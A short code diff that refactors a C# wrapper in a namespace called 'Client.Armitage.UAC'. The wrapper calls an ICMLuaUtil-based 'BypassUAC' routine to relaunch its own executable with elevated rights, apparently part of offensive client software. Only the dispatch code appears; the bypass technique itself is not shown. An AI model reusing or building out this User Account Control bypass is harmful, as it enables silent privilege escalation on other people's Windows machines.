@@ -21,25 +21,17 @@ namespace Client.Armitage.UAC
     {
         public static bool QuickStart(string execpath, string args, UACMethods method)
         {
-            try
+            switch (method)
             {
-                switch (method)
-                {
-                    case UACMethods.ICMLuaUtil:
-                        return ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
-                }
-            }
-            catch
-            {
-
+                case UACMethods.ICMLuaUtil:
+                    return ucmCMLuaUtilShellExecMethod.BypassUAC(execpath, args);
             }
             return false;
-
         }
         public static bool QuickStart(UACMethods method)
         {
-            return QuickStart(Constants.MyPath, 
-                Constants.MyProcessID.ToString() + " " + (int)method, 
+            return QuickStart(Constants.MyPath,
+                Constants.MyProcessID.ToString() + " " + (int)method,
                 method);
         }
     }
